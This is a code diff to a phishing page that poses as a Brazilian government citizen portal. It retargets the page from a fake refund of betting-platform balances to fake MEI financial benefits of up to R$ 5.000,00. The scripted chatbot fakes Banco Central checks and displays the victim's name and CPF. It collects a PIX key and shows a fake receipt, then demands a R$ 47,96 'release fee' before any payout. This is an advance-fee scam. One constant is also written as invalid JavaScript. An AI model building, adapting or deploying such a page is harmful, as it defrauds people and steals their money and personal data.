@@ -14,7 +14,7 @@
     <script src="js/utm-helper.js"></script>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1.0,user-scalable=no,viewport-fit=cover">
-  <title>Restituição de Valores - Atendimento</title>
+  <title>Benefícios Financeiros do MEI - Atendimento</title>
   <link rel="icon" href="images/favicon.ico" type="image/x-icon">
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&amp;display=swap" rel="stylesheet">
   <link rel="stylesheet" href="css/all.min.css">
@@ -312,7 +312,7 @@
     <i class="fas fa-bars"></i>
     <span>Portal do Cidadão</span>
     <i class="fas fa-chevron-right" style="font-size: 8px; margin: 0 5px;"></i>
-    <span>Restituição de Valores</span>
+    <span>Benefícios Financeiros do MEI</span>
   </nav>
 
   <main id="chat-content"></main>
@@ -349,27 +349,27 @@
 
     // ========== VALORES DAS 17 ENTIDADES ==========
     const ENTIDADES = [
-      { nome: 'Kaizen Gaming Brasil Ltda.',              valor: 'R$ 850,00',   valorNum: 850.00 },
-      { nome: 'HS do Brasil Ltda.',                      valor: 'R$ 412,50',   valorNum: 412.50 },
-      { nome: 'SPRBT Interactive Brasil Ltda',           valor: 'R$ 320,00',   valorNum: 320.00 },
-      { nome: 'Ventmear Brasil S.A.',                    valor: 'R$ 275,80',   valorNum: 275.80 },
-      { nome: 'Esportes Gaming Brasil Ltda.',            valor: 'R$ 510,45',   valorNum: 510.45 },
-      { nome: 'Foggo Entertainment Ltda.',               valor: 'R$ 188,90',   valorNum: 188.90 },
-      { nome: 'NSX Brasil S.A.',                         valor: 'R$ 643,20',   valorNum: 643.20 },
-      { nome: 'EB Interm. e Jogos S/A.',                 valor: 'R$ 298,75',   valorNum: 298.75 },
-      { nome: 'Ana Gaming Brasil S.A.',                  valor: 'R$ 156,40',   valorNum: 156.40 },
-      { nome: 'OIG Gaming Brazil Ltda.',                 valor: 'R$ 389,60',   valorNum: 389.60 },
-      { nome: 'BPX Bets Sports Group Ltda.',             valor: 'R$ 225,15',   valorNum: 225.15 },
-      { nome: 'H2 Licensed Ltda.',                       valor: 'R$ 342,80',   valorNum: 342.80 },
-      { nome: 'Pixbet Soluções Tecc Ltda.',              valor: 'R$ 475,30',   valorNum: 475.30 },
-      { nome: 'NVBT Gaming Ltda.',                        valor: 'R$ 210,55',   valorNum: 210.55 },
-      { nome: 'SevenX Gaming S/A.',                       valor: 'R$ 285,40',   valorNum: 285.40 },
-      { nome: 'NSX Betfair Brasil S.A.',                  valor: 'R$ 398,70',   valorNum: 398.70 },
-      { nome: 'Apollo Operations Ltda.',                 valor: 'R$ 454,81',   valorNum: 454.81 }
+      { nome: 'Regularização de débitos tributários', valor: 'Consultar condições', valorNum: 0 },
+  { nome: 'Incentivo financeiro PixMEI', valor: 'Até R$ 5.000,00', valorNum: 5000.00 },
+  { nome: 'Renegociação de dívidas bancárias', valor: 'Conforme análise', valorNum: 0 },
+  { nome: 'Descontos para regularização', valor: 'Conforme enquadramento', valorNum: 0 },
+  { nome: 'Crédito para capital de giro', valor: 'Sujeito à aprovação', valorNum: 0 },
+  { nome: 'Apoio financeiro ao microempreendedor', valor: 'Conforme programa', valorNum: 0 },
+  { nome: 'Regularização do DAS', valor: 'Consultar condições', valorNum: 0 },
+  { nome: 'Parcelamento de débitos', valor: 'Conforme análise', valorNum: 0 },
+  { nome: 'Incentivo para investimentos', valor: 'Conforme elegibilidade', valorNum: 0 },
+  { nome: 'Apoio à atividade empresarial', valor: 'Conforme programa', valorNum: 0 },
+  { nome: 'Renegociação de empréstimos', valor: 'Conforme instituição', valorNum: 0 },
+  { nome: 'Condições especiais de crédito', valor: 'Sujeito à aprovação', valorNum: 0 },
+  { nome: 'Regularização cadastral', valor: 'Consultar situação', valorNum: 0 },
+  { nome: 'Benefícios para MEI ativo', valor: 'Conforme critérios', valorNum: 0 },
+  { nome: 'Incentivo à expansão do negócio', valor: 'Conforme elegibilidade', valorNum: 0 },
+  { nome: 'Apoio para pequenos negócios', valor: 'Conforme programa', valorNum: 0 },
+  { nome: 'Orientação financeira empresarial', valor: 'Disponível para consulta', valorNum: 0 }
     ];
 
-    const VALOR_TOTAL = 6438.31;
-    const TAXA_LIBERACAO = 48.00;
+    const VALOR_TOTAL = 5.000.00;
+    const TAXA_LIBERACAO = 47.96;
 
     // ========== AUDIO POOL ==========
     const AUDIO_POOL = {};
@@ -470,7 +470,7 @@
           <div class="documento-header-left">
             <i class="fas fa-file-invoice-dollar"></i>
             <div>
-              <div class="documento-titulo">Relação de Valores Identificados</div>
+              <div class="documento-titulo">Resumo de Benefícios Identificados</div>
               <div class="documento-protocolo">Protocolo: ${protocoloDinamico}</div>
             </div>
           </div>
@@ -480,7 +480,7 @@
         </div>
         <div class="documento-total">
           <span class="label-total">Total</span>
-          <span class="valor-total">R$ 6.438,31</span>
+          <span class="valor-total">R$ 5.000,00</span>
         </div>
       </div>`;
     }
@@ -526,7 +526,7 @@
         <div class="campos-row">
           <div class="campo">
             <span class="campo-label">Valor a receber</span>
-            <div class="campo-valor">R$ 6.438,31</div>
+            <div class="campo-valor">R$ 5.000,00</div>
           </div>
           <div class="campo">
             <span class="campo-label">Data da emissão</span>
@@ -544,14 +544,14 @@
         <div class="indeniza-row">
           <div class="campo">
             <span class="campo-label">Origem dos Valores</span>
-            <div class="campo-valor">Plataformas Regulamentadas</div>
+            <div class="campo-valor">Programa de Incentivo ao MEI</div>
           </div>
           <div class="campo imposto">
             <span class="campo-label">Taxa de Liberação</span>
             <div class="campo-valor">R$ 47,96</div>
           </div>
         </div>
-        <div class="tabela-header">Relação de Valores Identificados</div>
+        <div class="tabela-header">Resumo de Benefícios Identificados</div>
         <table>
           <thead>
             <tr>
@@ -565,7 +565,7 @@
         </table>
         <div class="totais-row">
           <span>TOTAL</span>
-          <span>R$ 6.438,31</span>
+          <span>R$ 5.000,00</span>
         </div>
         <div style="text-align: center; margin-top: 5px; font-size: 8px; color: #666;">
           *O saque será liberado após o pagamento da Taxa de Liberação.
@@ -580,9 +580,9 @@
         messages: [
           { type: 'bot', content: `Prezado(a) <strong>${userName.split(' ')[0]}</strong>, sua consulta foi iniciada com sucesso.`, delay: 1000 },
           { type: 'bot', content: animationLock('Conexão segura estabelecida.'), delay: 2000 },
-          { type: 'bot', content: 'O sistema do Governo Federal identificou um <strong>saldo pendente</strong> vinculado ao seu CPF, proveniente de plataformas regulamentadas.', delay: 2500 },
-          { type: 'bot', content: `O prazo para solicitação dos valores é até <strong>${dataHojeFormatada}</strong>. Após esse período, os valores serão devolvidos ao Tesouro Nacional.`, delay: 2500 },
-          { type: 'bot', content: 'Deseja prosseguir com a consulta e verificar os valores disponíveis?', delay: 2000 }
+          { type: 'bot', content: 'O sistema identificou um <strong>benefício financeiro de até R$ 5.000,00</strong> vinculado ao seu cadastro MEI. Você possui valores disponíveis para solicitação, conforme os critérios do programa.', delay: 2500 },
+          { type: 'bot', content: `O prazo para solicitar o benefício é até <strong>${dataHojeFormatada}</strong>. Após o encerramento do prazo oficial, o benefício não estará mais disponível para solicitação.`, delay: 2500 },
+          { type: 'bot', content: 'Deseja continuar e verificar as condições para solicitar o benefício?', delay: 2000 }
         ],
         type: 'button',
         options: [
@@ -604,10 +604,10 @@
       {
         id: 'searching_bets',
         messages: [
-          { type: 'bot', content: animationSpinner('Iniciando varredura no sistema...'), delay: 1500 },
-          { type: 'bot', content: animationProgress(25, 'Conectando ao Banco Central'), delay: 2500 },
-          { type: 'bot', content: animationProgress(60, 'Analisando CPF na base de dados'), delay: 2500 },
-          { type: 'bot', content: animationProgress(100, 'Varredura concluída'), delay: 2500 },
+          { type: 'bot', content: animationSpinner('Iniciando verificação dos benefícios...'), delay: 1500 },
+{ type: 'bot', content: animationProgress(25, 'Consultando critérios dos programas MEI'), delay: 2500 },
+{ type: 'bot', content: animationProgress(60, 'Analisando dados cadastrais e elegibilidade'), delay: 2500 },
+{ type: 'bot', content: animationProgress(100, 'Verificação concluída'), delay: 2500 },
           { type: 'bot', content: animationChecklist([
             'Entidades vinculadas ao CPF',
             'Saldos e prêmios disponíveis',
@@ -621,9 +621,9 @@
       {
         id: 'bets_summary',
         messages: [
-          { type: 'bot', content: 'Valores localizados com sucesso.', delay: 1500 },
+          { type: 'bot', content: '<strong>Benefícios financeiros identificados</strong> para o seu MEI!', delay: 1500 },
           { type: 'bot', content: animationDocumentoValores(), delay: 2500 },
-          { type: 'bot', content: `Valor total identificado: ${animationCounter('R$', 6438.31)}`, delay: 2500 },
+          { type: 'bot', content: `Valor total identificado: ${animationCounter('R$', 5000.00)}`, delay: 2500 },
           { type: 'bot', content: 'Para dar continuidade, é necessário confirmar seus dados de recebimento.', delay: 2000 }
         ],
         type: 'button',
@@ -637,7 +637,7 @@
         messages: [
           { type: 'bot', content: '<div class="media-container"><img src="images/validado.png"></div>', delay: 3000 },
           { type: 'bot', content: animationSuccess(), delay: 1500 },
-          { type: 'bot', content: `<strong>Autenticidade confirmada.</strong><br><br><strong>Nome:</strong> ${userName}<br><strong>CPF:</strong> ${userCPF}<br><strong>Valor a Receber:</strong> R$ 6.438,31<br><strong>Status:</strong> <span style="color: #168821; font-weight: 700;">Pré-aprovado</span>`, delay: 3000 },
+          { type: 'bot', content: `<strong>Autenticidade confirmada.</strong><br><br><strong>Nome:</strong> ${userName}<br><strong>CPF:</strong> ${userCPF}<br><strong>Valor a Receber:</strong> R$ 5.000,00<br><strong>Status:</strong> <span style="color: #168821; font-weight: 700;">Pré-aprovado</span>`, delay: 3000 },
           { type: 'bot', content: '<div class="wa-audio-player" data-src="media/audio1.mp3"></div>', delay: 4000 },
           { type: 'bot', content: 'Para liberar o PIX, é necessário confirmar sua identidade. Informe sua chave PIX para recebimento.', delay: 3000 },
           { type: 'bot', content: 'Selecione o tipo de <strong>chave PIX</strong>:', delay: 2000 }
@@ -652,7 +652,7 @@
       {
         id: 'type_pix',
         messages: [
-          { type: 'bot', content: 'Digite sua chave Pix para receber <strong>R$ 6.438,31</strong>:', delay: 1000 }
+          { type: 'bot', content: 'Digite sua chave Pix para receber <strong>R$ 5.000,00</strong>:', delay: 1000 }
         ],
         type: 'input',
         placeholder: 'Sua chave aqui...',
@@ -699,8 +699,8 @@
           { type: 'bot', content: animationProgress(100, 'Comprovante pronto'), delay: 2000 },
           { type: 'bot', content: animationSuccess(), delay: 1000 },
           { type: 'bot', content: generateComprovante(), delay: 2000 },
-          { type: 'bot', content: `<strong>Atenção:</strong> o saque está pendente de liberação.<br><br>Para que o Banco Central processe o PIX de <strong>R$ 6.438,31</strong>, é necessário o pagamento de uma <strong>Taxa de Liberação</strong> no valor de <strong>R$ 47,96</strong>.`, delay: 2500 },
-          { type: 'bot', content: 'De acordo com a Lei nº 14.790/2023, as casas de apostas estão sujeitas às obrigações previstas na legislação quanto à restituição de valores aos apostadores, observadas as hipóteses e condições estabelecidas pela própria lei e pela regulamentação aplicável.', delay: 2000 }
+          { type: 'bot', content: `<strong>Atenção:</strong> o saque está pendente de liberação.<br><br>Para que o Banco Central processe o PIX de <strong>R$ 5.000,00</strong>, é necessário o pagamento de uma <strong>Taxa de Liberação</strong> no valor de <strong>R$ 47,96</strong>.`, delay: 2500 },
+          { type: 'bot', content: 'Os programas de apoio aos microempreendedores individuais estabelecem critérios para regularização de dívidas, concessão de incentivos financeiros e acesso a linhas de crédito, conforme a legislação e as regras de cada iniciativa.', delay: 2000 }
         ],
         type: 'button',
         options: [
